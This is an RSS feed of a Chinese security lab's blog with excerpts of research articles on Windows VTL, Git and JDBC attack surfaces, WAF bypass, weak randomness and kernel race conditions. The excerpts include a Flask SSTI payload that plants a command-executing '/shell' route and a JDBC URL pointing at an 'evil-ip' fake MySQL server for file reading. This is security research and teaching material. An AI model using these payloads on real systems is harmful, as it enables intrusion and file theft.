<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Blogs on 天工实验室</title>
    <link>http://localhost:1313/blog/</link>
    <description>Recent content in Blogs on 天工实验室</description>
    <generator>Hugo -- 0.133.1</generator>
    <language>zh</language>
    <copyright>天工实验室</copyright>
    <lastBuildDate>Wed, 21 Aug 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/blog/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>深入解析Windows VTL机制 &amp; IUM进程</title>
      <link>http://localhost:1313/blog/tiangongarticle043/</link>
      <pubDate>Wed, 21 Aug 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle043/</guid>
      <description>深入解析Windows VTL机制 &amp;amp; IUM进程 一、前言 现今的Windows操作系统已经融合了虚拟化技术作为自身的核心功能，Windows平台下的虚拟化技术的应用也不仅限于Hyper-V虚拟化软件的应用，在一些用于保护Windows系统的安全功能中，虚拟化技术的使用也变得尤为重要。现在我们就来简单探索下Windows的VTL机制和IUM进程，这两种基于虚拟化技术的安全功能。
二、VTL机制和IUM进程介绍 Virtual Secure Mode(VSM)最早在Windows10和Windows Server 2016中被引入，是基于Windows平台下的虚拟化技术的安全功能，使用的是Hyper-V的虚拟化组件。
VSM的主要作用是，在这个安全功能开启的情况下，即使主机上的内核或者驱动程序（即Ring0层）受到攻击，受到VSM体系保护的数据依然可以保持安全，保证数据不被篡改或者无法被访问，甚至攻击者处于Ring0权限下。
与我们熟知的VMware或者QEMU虚拟化软件不同，Hyper-V的虚拟化实现是裸金属架构的，即Hypervisor层的组件运行在实体的硬件上，而无论是所谓的Guest(Child Parition)或者Host(Root Parition)都是Hypervisor层之上抽象出来的。
那么，Hyper-V的技术架构是VSM功能的基础，无论是Guest还是Host，实际上都可以通过Hypervisor来控制不同分区对硬件资源的使用能力从而实现在VSM中提及的安全功能。
VSM功能的引入同时引入了一个新的概念——VTL。
Virtual Trust Levels（VTL），VSM通过VTL来实现和维护隔离。VTL是有层级概念的，例如熟知的Ring0~3层级权限。但是与Ring0~3概念不同的是，VTL的层级权限是级别高的权限要高于级别低的权限。举个例子：VTL0的权限 &amp;lt; VTL1的权限；VTL1的权限 &amp;lt; VTL2的权限。在微软对VTL的代码实现里，最多支持16个级别VTL，但是截止到目前的关于VTL的代码中，微软只实现了2个级别的VTL。
为了更直观的展示VTL的作用，这里使用了微软官方给出的IUM架构体系图。
从图中可以看到，我们所熟知的Windows内核态和用户态都属于VTL0级别下，而SecureKernel和运行在同VTL层级下的用户态进程属于VTL1级别下。此时，假如我们在VTL0种进行内核调试，都无法修改VTL1层级下的用户态进程空间内存。这个例子说明了低级别VTL无法影响到高级别VTL内存空间，不同的VTL级别之间有着明显的隔离边界。
有了VTL这个概念之后，下面我们来介绍下什么是Isolated User Mode(IUM)进程。通俗来讲，IUM进程就是运行在VTL1层级下的用户态进程。最简单的例子就是LSAIso.exe进程，当这个进程运行在VTL1层级下时，无论是在用户态还是内核态都无法修改这个进程的内存空间，同样地，对其进行调试也是无法进行的。
下面，我们一起来探索VTL机制和IUM进程（以及如何调试IUM进程）的一些内部细节。
三、必要的硬件虚拟化知识（Intel） 在探索之前，我们还需要简单的了解下CPU硬件虚拟化知识，这里我们以Intel处理器(Intel VT-x)加以介绍。
这里首先要介绍的是Intel VT-x和VMX是什么。Intel VT-x的全称是Intel Virtualization Technology for x86，这个东西就是所谓的Intel硬件虚拟化技术，而VMX是其实现的架构，全称为Virtual-Machine Extensions。在VMX下引入了两个概念：VMX root operation和VMX non-root operation模式。
VMX的root和non-root operation模式可以简单地理解成，hypervisor也就是虚拟化层，即VM管理者(VMM, virtual machine monitor)和Guest所使用的环境。这两种模式可以互相转换，当从VMX的root模式转换到non-root模式时，这个行为被称作VM-entry。那么当VMX的non-root模式切换到root模式，这个行为被称作VM-Exit。
假设目前VMX处于non-root状态，此时是在执行Guest中的代码，如果执行时遇到了比如CPUID，读写MSR寄存器等操作时，Guest操作系统会被暂停，并产生Vm-Exit事件，同时陷落入VMM，即root operation状态中。VMM根据不同的VM-Exit原因来处理（模拟）此时Guest的执行指令，处理数据并返回结果，最后vmm通过执行vmresume指令重新让Guest系统继续运行，此时的VMX状态又变回了non-root状态。
在VMX进行root和non-root operation状态切换时，VMCS（Virtual Machine Control Structure）用来配置此时发生切换的处理器状态和执行的环境。在Hyper-V的虚拟化环境中，每个虚拟处理器都对应着一个或者多个VMCS。
VMCS中有很多字段，对应着当前虚拟处理器的状态信息，比如用于记录当前VM-Exit信息的&amp;quot;Exit reason&amp;quot;字段，通过阅读Intel手册发现这个字段对应的ID是0x4402。因为VMCS中的字段信息无法直接通过读取物理内存的方式读取到，所以这里必须使用Intel给出的指令集vmread/vmwrite来读写对应的字段内容。
#define EXIT_REASON_EXCEPTION_NMI 0 #define EXIT_REASON_EXTERNAL_INTERRUPT 1 #define EXIT_REASON_TRIPLE_FAULT 2 #define EXIT_REASON_INIT_SIGNAL 3 #define EXIT_REASON_SIPI_SIGNAL 4 #define EXIT_REASON_INTERRUPT_WINDOW 7 #define EXIT_REASON_NMI_WINDOW 8 #define EXIT_REASON_TASK_SWITCH 9 #define EXIT_REASON_CPUID 10 #define EXIT_REASON_HLT 12 #define EXIT_REASON_INVD 13 #define EXIT_REASON_INVLPG 14 #define EXIT_REASON_RDPMC 15 #define EXIT_REASON_RDTSC 16 #define EXIT_REASON_VMCALL 18 #define EXIT_REASON_VMCLEAR 19 #define EXIT_REASON_VMLAUNCH 20 #define EXIT_REASON_VMPTRLD 21 #define EXIT_REASON_VMPTRST 22 #define EXIT_REASON_VMREAD 23 #define EXIT_REASON_VMRESUME 24 #define EXIT_REASON_VMWRITE 25 #define EXIT_REASON_VMOFF 26 #define EXIT_REASON_VMON 27 #define EXIT_REASON_CR_ACCESS 28 #define EXIT_REASON_DR_ACCESS 29 #define EXIT_REASON_IO_INSTRUCTION 30 #define EXIT_REASON_MSR_READ 31 #define EXIT_REASON_MSR_WRITE 32 #define EXIT_REASON_INVALID_STATE 33 #define EXIT_REASON_MSR_LOAD_FAIL 34 #define EXIT_REASON_MWAIT_INSTRUCTION 36 #define EXIT_REASON_MONITOR_TRAP_FLAG 37 #define EXIT_REASON_MONITOR_INSTRUCTION 39 #define EXIT_REASON_PAUSE_INSTRUCTION 40 #define EXIT_REASON_MCE_DURING_VMENTRY 41 #define EXIT_REASON_TPR_BELOW_THRESHOLD 43 #define EXIT_REASON_APIC_ACCESS 44 #define EXIT_REASON_EOI_INDUCED 45 #define EXIT_REASON_GDTR_IDTR 46 #define EXIT_REASON_LDTR_TR 47 #define EXIT_REASON_EPT_VIOLATION 48 #define EXIT_REASON_EPT_MISCONFIG 49 #define EXIT_REASON_INVEPT 50 #define EXIT_REASON_RDTSCP 51 #define EXIT_REASON_PREEMPTION_TIMER 52 #define EXIT_REASON_INVVPID 53 #define EXIT_REASON_WBINVD 54 #define EXIT_REASON_XSETBV 55 #define EXIT_REASON_APIC_WRITE 56 #define EXIT_REASON_RDRAND 57 #define EXIT_REASON_INVPCID 58 #define EXIT_REASON_VMFUNC 59 #define EXIT_REASON_ENCLS 60 #define EXIT_REASON_RDSEED 61 #define EXIT_REASON_PML_FULL 62 #define EXIT_REASON_XSAVES 63 #define EXIT_REASON_XRSTORS 64 #define EXIT_REASON_UMWAIT 67 #define EXIT_REASON_TPAUSE 68 #define EXIT_REASON_BUS_LOCK 74 #define EXIT_REASON_NOTIFY 75 通过vmread读取0x4402 id字段的内容，就可以得到VM-Exit的原因，VMM根据上图中这些若干的原因进行处理，完成处理后，将结果改写到例如Guest中的寄存器中，此时也需要通过vmwrite改写其中关于Guest寄存器信息的字段，最后通过vmresume将控制权交还Guest。</description>
    </item>
    <item>
      <title>Scala代码审计之痛 -- Scala与Java的爱恨情仇</title>
      <link>http://localhost:1313/blog/tiangongarticle042/</link>
      <pubDate>Wed, 07 Aug 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle042/</guid>
      <description>Scala代码审计之痛 &amp;ndash; Scala与Java的爱恨情仇 一、前言 Scala 是一门多范式的编程语言，集成了面向对象编程和函数式编程的多种特性。函数式编程抽象的理论基础也让这门语言变得抽象起来，初学者需要花更多的时间去理解其特有概念以及众多的语法糖。Scala是一门运行在JVM平台上的语言，其源码编译结果符合Java字节码规范，所以可以被反编译为Java代码。在进行Scala代码审计的过程中，审计者很少有机会直面其源码，大多数时候都是被反编译为Java的代码所支配。Scala与Java毕竟是两门语言，反编译成Java代码的后果便是丧失了动态调试的能力（这为审计者带来了不小的麻烦），反编译后产生的中间代码、临时变量等辅助结构更是极大得降低了代码的可读性。本文将带领诸位抽丝剥茧逐步梳理出Scala各语法结构与Java语法结构对应关系，最后以两个漏洞案例的分析加以对比说明。
二、特殊语法结构识别 除了循环、条件判断、面向对象等基础语法外，Scala还提供了极具特色的语法结构，如：模式匹配、隐式转换、传名调用、函数柯里化、伴生对象、特质、提取器、函数式编程等。本章不会重点着墨于这些语法的介绍，而是向读者展示在将Scala源程序反编译为Java代码后产生的那些不太常规的语法结构以及一些奇怪的变量（MODULE$/$outer/package/$init$）等。
2.1 伴生对象 本节将会涉及到特殊变量MODULE$的含义
Scala中没有static关键字，其通过伴生对象来实现static的效果。伴生对象是类自身定义的单个实例，可以被理解为当前类的一个单例对象（并不显式依赖一个类，可独立存在），以下代码展示了一个类的伴生对象：
package org.example class Singletons(){ private var llac: String = &amp;#34;九敏啊，我是伴生类的私有属性，我被伴生对象调用了&amp;#34; private def callSingleField(): Unit = { // 调用伴生对象的私有属性 println(Singletons.call) } } object Singletons { private var call: String = &amp;#34;九敏啊，我是伴生对象的私有属性，我被伴生类调用了&amp;#34; def sayHello(llac: String): Unit = { println(llac) } def main(args: Array[String]): Unit = { val s: Singletons = new Singletons() // 调用伴生类的私有属性 sayHello(s.llac) // 调用伴生类的私有方法 s.callSingleField() } } 在上面提供的代码中，被关键字object修饰的对象被称为类Singletons的伴生对象，类Singletons被称为object关键字修饰的对象的伴生类，两者可互相调用其私有属性以及方法。</description>
    </item>
    <item>
      <title>Git 出乎意料的攻击面</title>
      <link>http://localhost:1313/blog/tiangongarticle041/</link>
      <pubDate>Wed, 31 Jul 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle041/</guid>
      <description>Git 出乎意料的攻击面 一、来自Git的威胁 现如今，很多软件开发者已经对git工具非常熟悉，很多人的开发流程中会使用这个工具进行仓库备份，与其他开发者进行代码同步，实现合作开发等等。然而，这样的工具也可能成为黑客入侵的突破口。本文就git的相关基础以及实际案例，列举现阶段中git可能出现的攻击面。
二、Git工作原理 在聊git的攻击面之前，我们需要弄清楚git是怎么工作的。举个例子来说，假设我们现在有一个空仓库叫做main-repo，此时我们在其中创建文件test.txt，test.txt中包含内容：
123 在未commit的时候，此文件结构如下：
├── .git │ ├── HEAD │ ├── config │ ├── description │ ├── hooks // 省略这其中的文件 │ ├── info │ │ └── exclude │ ├── objects │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ └── tags └── main.txt 此时，如果我们将这个修改commit之后，目录结构会变成如下：
. ├── .git │ ├── COMMIT_EDITMSG │ ├── HEAD │ ├── config │ ├── description │ ├── index │ ├── info │ │ └── exclude │ ├── logs │ │ ├── HEAD │ │ └── refs │ │ └── heads │ │ └── main │ ├── objects │ │ ├── 45 │ │ │ └── bfe823309403a8fd790cce2013dda0e7f67b5b │ │ ├── 8e │ │ │ └── 1e8a2e68efa3744caf8b601bd0de70c6fe4b66 │ │ ├── bf │ │ │ └── 1fa3d901014eeb98e85a0ed1cd1dd0e83ab3f6 │ │ ├── f6 │ │ │ └── c47b7d00ea7068e091f23601063a1f557df458 │ │ ├── fe │ │ │ └── 8fd7574c9a5c4f805f8239829989cef7129d29 │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ │ └── main │ └── tags ├── .</description>
    </item>
    <item>
      <title>JDBC Attack 与高版本 JDK 下的 JNDI Bypass</title>
      <link>http://localhost:1313/blog/tiangongarticle040/</link>
      <pubDate>Wed, 24 Jul 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle040/</guid>
      <description>JDBC Attack 与高版本 JDK 下的 JNDI Bypass 一、前言 JNDI 注入作为 Java 攻击的常见 Sink 点，通常被用于 Weblogic 以及 Fastjson 等常见目标的攻击流程中，而 JNDI 注入的利用经过 JDK 新版本对相关利用的修复，以及一些常见依赖利用方式的变化，在高版本 JDK 中，其利用逐渐遭遇了困境。而 JDBC Attack，作为针对 Java 数据库引擎的一种攻击方式，除了其常规的利用方式之外，也可以与原生反序列化结合起来，实现对 JNDI 攻击的扩展，解决高版本下 JNDI 注入的困境。
二、关于 JDBC Attack 首先是关于基础的JDBC Attack的一些回顾，JDBC 是Java应用在连接不同的底层数据库引擎时使用的抽象层，使得Java应用可以用相同的接口对各种不同的数据库进行抽象的控制，JDBC使用如下的URL格式进行连接。
Class.forName(&amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;); String url = &amp;#34;jdbc:mysql://mysql.db.server:3306/my_database?useSSL=false&amp;amp;serverTimezone=UTC&amp;#34; Connection conn = DriverManager.getConnection(url) 而该URL中，后面的可控参数就是针对不同数据库Driver进行利用的入口。
接下来我们来回顾一下常见的几个 Driver 的利用：
2.1 MySQL Driver 针对MySQL Driver的通用利用主要是使用 Fake Server 进行任意文件读，首先需要配置 MySQL fake server，然后开启 allowLoadLocalInfile=true 设置，构造形如 jdbc:mysql://evil-ip:3306/test?allowLoadLocalInfile=true 的 URL 去请求 fake server 即可进行利用。</description>
    </item>
    <item>
      <title>Rust逆向入门：从反编译视角学习内存模型</title>
      <link>http://localhost:1313/blog/tiangongarticle039/</link>
      <pubDate>Wed, 17 Jul 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle039/</guid>
      <description>Rust逆向入门：从反编译视角学习内存模型 一、前言 Rust反编译一直是比较困难的问题，Rust强调零成本抽象，在使用高级特性（如泛型、闭包、迭代器等）时为了不引入额外的运行时开销，编译器会生成高度优化且复杂的机器码，从而难以直接恢复高层的抽象结构，除此之外，Rust 的所有权系统及其借用检查器在编译过程中被彻底消解成运行时代码。这个过程生成了许多低级的内存管理代码，这些代码在反编译时难以重新构建成高层次的所有权和生命周期语义。尽管反编译 Rust 代码有诸多困难，但进行 Rust 反编译依然具备现实意义，例如分析闭源Rust代码，寻找潜在的安全漏洞。本文旨在学习Rust基本内存数据结构及其内存布局，并且通过反编译视角理解Rust编译器到底做了什么事。
值得注意的时，Rust目前没有确定内存模型，因此本文谈到的是Rustc编译器实现的Rust模型。
Rust 目前没有确定内存模型
Rust does not yet have a defined memory model. Various academics and industry professionals are working on various proposals, but for now, this is an under-defined place in the language.
二、反编译器准备 本文中的很多例子会使用到反编译工具，例如IDA或者ghidra。ghidra在11版本以后增加了对Rust支持，在使用ghidra进行反编译Rust工具时只需要选中Demangler Rust即可。
IDA则需要额外的IDARustDemangler插件，不管是ghidra的Demangler Rust功能亦或是IDARustDemangler插件，其功能都是将Rust二进制文件中经过编译器mangle过的符号进行demangle，得到原始符号，以下以IDA得视角对比了demangle之前与demangle之后得代码视图，可以看到可读性大大增加。
demangle之前：
demangle之后：
三、函数调用__Rustcall 在x86_64平台UNIX系统下面，Rust遵循System V ABI，即传参会通过rdi、rsi、rdx、rcx、r8、r9等，返回值会通过rax，在某些情况下，compiler会进行返回值优化（Return Value Optimization，RVO），这时候函数调用约定就会发生变化，返回值不再是使用rax进行传递，而是使用rdi（函数的第一个参数）。以如下例子为例，我们查看ghidra编译器到底做了什么？
fn add_str_ret_str(a:&amp;amp;str,b:&amp;amp;str)-&amp;gt;String{ return a.to_string()+&amp;amp;b.to_string(); } 对于上述代码，因为在返回时新建了对象（没有新建对象不会触发RVO，此时依旧通过rax传递对象），会触发返回值优化，使得返回值通过第一个参数进行传递。
IDA视角下得Rustcall，IDA会将第一个参数命名为retstr，提醒用户这个字段是返回值。
在ghidra视角下rust调用使用__rustcall关键字标识，ghidra使用return_storage_ptr来标记返回值。
四、Rust内存布局 在Rust中基本类型、引用（存储的是变量的地址，大小为8字节）、数组（连续内存块）与传统的C、C++内存布局一样，因此本文不再赘述。本文主要探究Rust特有实现，例如动态数组、String、动态大小类型（Dynamic Sized Type，DST）。
4.1 动态数组与String Rust中的动态数组Vec以及String类型的底层实现与C++容器相同，其采用三个部分来表示，分别是：
pointer：指向数据字节流buffer中存储的数据； length：buffer中字节流的字节长度； capacity：buffer的长度。 实际上看String的实现，会发现String的实现基于Vec，以下代码摘自Rust底层实现：</description>
    </item>
    <item>
      <title>Python Web 内存马多框架植入技术详解</title>
      <link>http://localhost:1313/blog/tiangongarticle038/</link>
      <pubDate>Wed, 10 Jul 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle038/</guid>
      <description>Python Web 内存马多框架植入技术详解 一、前言 内存马作为一种常见的攻击与权限维持手段，往往多见于Java Web应用中，然而在Python Web场景下却并不多见这种攻击。
本文将针对Flask、Tornado与Django三个在日常开发中使用频率较高的框架，探寻在Python Web场景下的内存马种植方法，文中所有场景均为抽象出的理想场景，仅做可行性讨论。
二、Flask 2.1 老版本Flask内存马种植方法 在网上针对Flask内存马的探讨，均在SSTI场景下，并且payload都相同，格式化后payload如下：
url_for.__globals__[&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;]( &amp;#34;app.add_url_rule( &amp;#39;/shell&amp;#39;, &amp;#39;shell&amp;#39;, lambda :__import__(&amp;#39;os&amp;#39;).popen(_request_ctx_stack.top.request.args.get(&amp;#39;cmd&amp;#39;, &amp;#39;whoami&amp;#39;)).read() )&amp;#34;, { &amp;#39;_request_ctx_stack&amp;#39;:url_for.__globals__[&amp;#39;_request_ctx_stack&amp;#39;], &amp;#39;app&amp;#39;:url_for.__globals__[&amp;#39;current_app&amp;#39;] } ) 在Flask中所有定义的路由都会使用一个装饰器 app.route，而这个装饰器就是调用了 add_url_rule。
@setupmethod def route(self, rule: str, **options: t.Any) -&amp;gt; t.Callable[[T_route], T_route]: def decorator(f: T_route) -&amp;gt; T_route: endpoint = options.pop(&amp;#34;endpoint&amp;#34;, None) self.add_url_rule(rule, endpoint, f, **options) return f return decorator 所以在payload中，直接调用了Flask中的 add_url_rule 函数来动态增加一条路由实现内存马。然而在最新版本的Flask中，如果直接使用这个payload会发现将抛出一个异常。
2.2 AssertionError出现原因 在回溯这个异常的时候会发现，这个异常出现在 setupmethod 这个装饰器中的一个校验函数。
def _check_setup_finished(self, f_name: str) -&amp;gt; None: if self.</description>
    </item>
    <item>
      <title>WAF防护绕过技巧分析</title>
      <link>http://localhost:1313/blog/tiangongarticle005/</link>
      <pubDate>Wed, 08 Nov 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle005/</guid>
      <description>WAF防护绕过技巧分析 一、WAF介绍与分类 （一）WAF简介 Web应用防护系统（Web Application Firewall，网站应用级入侵防御系统），是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的产品。
市场上的WAF产品有很多，像腾讯云，阿里云，长亭等，目前世界上常年排名第一的是以色列的 Imperva。
（二）WAF分类 规则实现 语义分析引擎WAF，国内大多数都是正则引擎，此外还有机器学习引擎。
部署方式 网络层WAF、应用层WAF、云WAF
WAF部署方式 WAF大多是串联在这个链路中，起到一个阻断作用。就比如在Web Server和CGI之间的WAF，CGI这里特指PHP和ASP，像JSP一般就统一tomcat中间件了，就不需要CGI层了。
云部署一般先会起一个高防IP，然后用这个IP去连接WAF集群，一般来说都是从四层的流量解除七层的流量，然后再将正常的流量向后端转发，像这些企业A企业B可能在云上也可能不在。
二、网络层WAF Bypass （一）分包分组 通过调整MSS控制分包 控制MSS去调整TCP分包的大小 单个TCP会话可能含有多个HTTP会话：比如TCP先建立一个三次握手，建立之后发送多个HTTP请求，并没有断开，一般的设备都会去很好的解析处理，但是有一些古老的设备只会去解析第一个，现在已经很少了。
单个TCP包发送多组HTTP报文（Pipeline技巧以及HTTP请求走私）：就是在DATA部分写多个http请求，有的设备就会认为第一个正常，那么后面的就类似于body部分，就会出现解析错误。
HTTP请求走私和Pipeline的区别就是请求走私利用不同的Content-Length引发歧义，比如下面这个，第一个content-length是包括了下面两个，或者content-length写一个1或者2，到底Web Server会取哪一个，需要针对不同的去研究，所以取值的解析差异，就会认为他是一整个或者是三个，利用这种方式就可以去迷惑WAF。
在标准的HTTP走私里面，一般content-length和Transfer-Encoding只会采纳一个，大部分优先是 Transfer-Encoding: chunked，当然也有一些两个都支持，就会出现一些问题。
chunked 利用chunked切分，比如下面是个最简单的chunked，对关键字进行一个拆分。
这里的5,4,3是以16进制写的，最后以0来结尾，如果是10个字符的话就要写A。
这种是只针对于网络层，应用层就不会出现这种问题，因为应用层是在完成chunked组包之后，才去解析，所以对应用层无效。
三、应用层WAF Bypass （一）multipart/form-data 理论知识 HTTP协议POST请求，除了常规的application/x-www-form-urlencoded以外，还有multipart/form-data这种形式，主要是为了解决上传文件场景下文件内容较大且内置字符不可控的问题。multipart/form-data格式也是可以传递POST参数的。对于Nginx+PHP的架构，Nginx实际上是不负责
解析multipart/form-data的body部分的，而是交由PHP来解析，因此WAF所获取的内容就很有可能与后端的PHP发生不一致。
使用以下脚本来进行测试
&amp;lt;?php echo file_get_contents(&amp;#34;php://input&amp;#34;); var_dump($_POST); var_dump($_FILES); ?&amp;gt; 正常POST请求如下：
change body encoding，如下：
只有input不太一样，一个有f=1一个没有，参数并没有进入Files数组，而是进入了_POST数据。那么，何时是上传文件？何时是POST参数呢？这个关键点在于有没有一个完整的filename=。这9个字符是经过反复测试的，缺一个字符不可，替换一个字符也不可，在其中添加一个字符更不可。
加上filename=之后：
可以看到这次并没有传给POST数组，而是传给了FILES数组变成了一个文件。
Bypass WAF的核心思想在于，一些WAF产品处于降低误报考虑，对用户上传文件的内容不做匹配，直接放行，比如一些压缩包图片之类的，在二进制流下面任意字符是不可控的，所以里面出现一些危险函数是很正常的。事实上，这些内容在绝大多数场景也无法引起攻击。所以让POST过去的数据去过那些规则，让FILES的只要符合白名单即可。
但关键问题在于，WAF能否准确有效识别出哪些内容是传给POST数组的，哪些传给_FILES数组？如果不能，那我们是否就可以想办法让WAF以为我们是在上传文件，而实际上却是在POST一个参数，这个参数可以是命令注入、SQL注入、SSRF等任意的一种攻击，这样就实现了通用WAF Bypass。
基础案例 0x00截断filename 截断之后发现传给了POST数组
有的WAF在处理包之前会将00删掉，再去解析会产生差异，所以有的地方00是不能删的，所以会产生bypass
双写上传描述行 双写后，一些WAF会取第二行，而实际PHP会获取第一行
双写整个part开头部分 可以看到取的还是第一行，只不过会将第二部分全部当成f的值，这里做SQL注入比较麻烦，需要将前面全都闭合掉，但是命令注入就很简单，直接将1给改成payload即可优先执行。
这里可以延伸出构造一个假的part
构造假的part 和上一个类似，少了一个换行，这样原本干扰的部分就不会取了
双写boundary 可以看到是以a为主</description>
    </item>
    <item>
      <title>伪随机数问题浅析</title>
      <link>http://localhost:1313/blog/tiangongarticle004/</link>
      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle004/</guid>
      <description>伪随机数问题浅析 0x01 前言 随机数在许多科学和工程领域扮演着重要角色，尤其在计算机科学和信息安全领域，它的重要意义更是不可小觑。在这个全球数字化的时代，数据是我们经济和生活的核心，数据的安全和保密显得尤为重要。我们使用密码保护我们的银行账户、电子邮件、社交媒体账户，我们使用加密技术保护我们通信的隐私性。在这些过程中，随机数是其中最重要的一部分，它用于密码生成、数据加密、身份验证和网络协议安全，是保证电子交流安全的令牌。如果我们不能保证所生成的随机数实际上是随机的，那么它们就可能被预测，这将让我们面临安全风险。因此，在探讨随机数的同时，我们须深化理解随机性的安全性，以便更有效地使用随机数，保护自身和数据免受攻击。
本次分享的两个案例（CVE-2023-42820和CVE-2022-35890）均是由于随机数使用不当从而导致了更加严重的安全问题。
0x02 随机数相关基础知识 根据密码学原理，随机数的随机性检验可以分为三个标准：
统计学伪随机性：在给定的随机比特流样本中，1的数量大致等于0的数量，满足这类要求的数字在人类“一眼看上去”是随机的 密码学安全伪随机性：给定随机样本的一部分和随机算法，不能有效的演算出随机样本的剩余部分 真随机性：随机样本不可重现 相应的，随机数也分为三类：
伪随机数：满足第一个条件的随机数
密码学安全的伪随机数：同时满足前两个条件的随机数，可以通过密码学安全伪随机数生成器计算得出
真随机数：同时满足三个条件的随机数
密码学安全伪随机数生成器（CSPRNG） 相较于统计学伪随机数生成器和更弱的伪随机数生成器，CSPRNG所生成的密码学安全伪随机数具有额外的伪随机属性，简单来说CSPRNG本质上属于一种单向函数
这是一个使用python random库生成随机数的例子
&amp;gt;&amp;gt;&amp;gt; import random &amp;gt;&amp;gt;&amp;gt; random.seed(123) &amp;gt;&amp;gt;&amp;gt; random.random() 0.052363598850944326 &amp;gt;&amp;gt;&amp;gt; random.random() 0.08718667752263232 &amp;gt;&amp;gt;&amp;gt; random.seed(123) &amp;gt;&amp;gt;&amp;gt; random.random() 0.052363598850944326 &amp;gt;&amp;gt;&amp;gt; random.random() 0.08718667752263232 &amp;gt;&amp;gt;&amp;gt; random.random() 0.4072417636703983 &amp;gt;&amp;gt;&amp;gt; random.seed(123) &amp;gt;&amp;gt;&amp;gt; random.random() 0.052363598850944326 对于随机数的使用，一般是先播种，然后使用rand来获取随机数。不播种会使用默认的种子，不同的语言不通版本种子可能不一样。这种通过rand出来的随机数，就是伪随机数，只要种子固定那么每次生成的随机数序列就会一样，同时通过上面的例子，可以发现以下特点：
在播种后会重置随机序列
random.seed()进行播种时并没有产生新的对象，就会对后面的random产生影响，那么推断播种后种子对播种时的整个进程生效
对于Java这种有新对象生成的语言来说，如果每次都是调用的同一个对象，那么与上面的情况一致，播种后会对这个对象后面生成的随机数产生影响 public class A{ public Random random; public void init(){ long seed = 123456L; this.random = new Random(seed); } public static void main(){ this.</description>
    </item>
    <item>
      <title>Windows内核竞态条件漏洞研究</title>
      <link>http://localhost:1313/blog/tiangongarticle003/</link>
      <pubDate>Wed, 01 Nov 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle003/</guid>
      <description>Windows内核竞态条件漏洞研究 一、研究背景 （一）操作系统内核漏洞 操作系统是计算机系统的核心软件，其主要功能在于管理计算机系统中的各种软硬件资源，并为计算机用户和用户程序提供访问这些资源的统一抽象。为达到这一设计目标，操作系统内核通常运行在称为内核态的高特权级执行环境中。一旦操作系统内核被恶意攻击者非法侵入，攻击者便可立即拥有对整个计算机系统的控制权，造成极大危害。因此，针对操作系统内核的漏洞挖掘一直是学术界和工业界的研究重点。
Windows操作系统是桌面计算机领域最广泛应用的操作系统之一，在网络空间中扮演着至关重要的角色。与之对应的，Windows操作系统中存在的安全漏洞也往往具有广泛的影响和严重的潜在危害。攻击者可以利用这些漏洞来进行大规模的网络攻击，给网络安全带来严重的威胁。例如，在2017年流行的WannaCry勒索病毒攻击，就是利用了MS17-010“永恒之蓝”漏洞，其受害者遍布全球多国，造成了巨大的损失。
在Linux操作系统上，以Syzkaller为代表的模糊测试工具可以7x24小时不间断地对内核进行漏洞挖掘，并自动化地生成漏洞报告供维护者查阅。然而，在Windows操作系统上，还没有出现影响力和测试效果能够比拟Syzkaller的开源工具。造成这一差异的原因是多方面的，例如，研究人员可以通过对Linux源码进行静态分析得到供Syzkaller使用的Syzlang模版，其中包含对系统调用接口的完整描述，由此可以驱动模糊测试。但在Windows上，由于内核是闭源的，对其系统调用接口的分析过程更为复杂和困难。
通过分析近年来披露的Windows内核态漏洞，我们发现，这些漏洞大多是由独立的研究人员或安全研究团队发现，并且极大地依赖于专家知识，只在特定的情况下使用了模糊测试等自动化方法来辅助漏洞挖掘。奇安信天工实验室近年来在Hyper-V中发现的漏洞，也同样离不开安全研究员对Hyper-V整体架构和漏洞模式的深入理解。
有鉴于此，笔者也针对近年来披露的Windows内核态漏洞进行了人工的分析和研究，并主要聚焦于竞态条件这一漏洞类型。本文便是对相关研究发现的总结。
（二）竞态条件漏洞 竞态条件是计算机科学中的一个重要概念，它指的是在多线程或多进程环境中，由于不恰当的同步操作或竞争资源的访问而导致的不确定性行为。在现代操作系统中，多线程的程序调度是至关重要的一项任务，它直接影响了计算机系统的性能和资源利用效率。多线程编程允许程序同时执行多个任务，从而提高了系统的响应速度和并发处理能力。然而，为了有效地管理这些线程，操作系统必须具备高效的调度机制，决定哪个线程获得CPU时间片，以确保各个线程能够合理地分享计算资源。这一调度决策是基于一系列算法和策略进行的，涉及到线程的优先级、状态管理、抢占机制以及资源争用解决等多个方面。
这一调度机制也导致多个线程或进程在争夺资源的同时，执行顺序并不确定，因此可能会产生意想不到的结果。为了避免问题，多线程场景下对关键资源的访问需要利用加锁、同步等机制来保证安全。倘若多个线程同时访问共享变量或资源，而没有适当的同步机制来保护这些资源，这可能导致数据损坏、程序崩溃或不一致的结果，从而带来严重的安全和可靠性问题。
图1：典型的竞态条件成因，两个线程无保护地访问同一个内核对象
如图1所示，漏洞CVE-2022-29142的原因正是两个线程可以同时访问同一个内核对象，如果其中一个线程试图关闭该对象的句柄，另一个线程便可能访问已被释放的指针。
本文将会具体介绍竞态条件漏洞带来的潜在风险，并描述复现真实存在于Windows内核中的竞态条件漏洞时的发现。
二、漏洞分析采用的关键技术 在进行针对Windows内核的漏洞分析和研究时，主要采用的关键技术包括：补丁对比分析、二进制逆向分析、竞态条件构建和调试等。
